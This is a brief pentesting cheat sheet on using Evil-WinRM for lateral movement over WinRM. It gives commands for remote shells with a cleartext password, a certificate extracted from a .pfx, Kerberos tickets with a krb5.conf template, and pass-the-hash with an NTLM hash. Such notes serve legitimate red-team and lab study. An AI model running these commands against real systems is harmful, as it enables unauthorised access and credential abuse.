# Evil-WinRM 

## Link: https://github.com/Hackplayers/evil-winrm

## Port: 5985 (Over HTTP) 5986 (Over HTTPS)

## TIP: Use -S flag to enable SSL. Use this when the WinRM port is 5986 (Over HTTPS)

### Do lateral movement via WinRM protocol using foudn credentials with evil-winrm

## Authentication Methods

#### 1) Clear text Password

 - evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD

#### 2) Certificate (.pfx file)

 - openssl pkcs12 -in USER_PFX_CERT.pfx -nocerts -out key.pem -nodes

 - openssl pkcs12 -in USER_PFX_CERT.pfx -nokeys -out cert.pem

### After generating the private key from the .pfx file, we use Evil-WinRM to authenticate

 - evil-winrm -i TARGET_IP -c CERT.pem -k KEY.pem

#### 3) Kerberos

 - kinit USERNAME@DOMAIN.TLD (Authenticate and retrieve a ticket)

 - Configure /etc/krb5.conf file with the appropriate settings (Replace some of the placeholders for your use case)

[libdefaults]
    default_realm = DOMAIN.TLD
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    DOMAIN.TLD = {
        kdc = IP or Hostname of KDC/Domain Controller
        admin_server = IP or Hostname of Admin Server
    }

[domain_realm]
    .domain.tld = DOMAIN.TLD
    domain.tld = DOMAIN.TLD

 - evil-winrm -i TARGET_IP -u USERNAME -r DOMAIN -k

#### 4) NTLM Authentication (Pass-the-Hash)

 - evil-winrm -i TARGET_IP -u USER -H NTLM_HASH
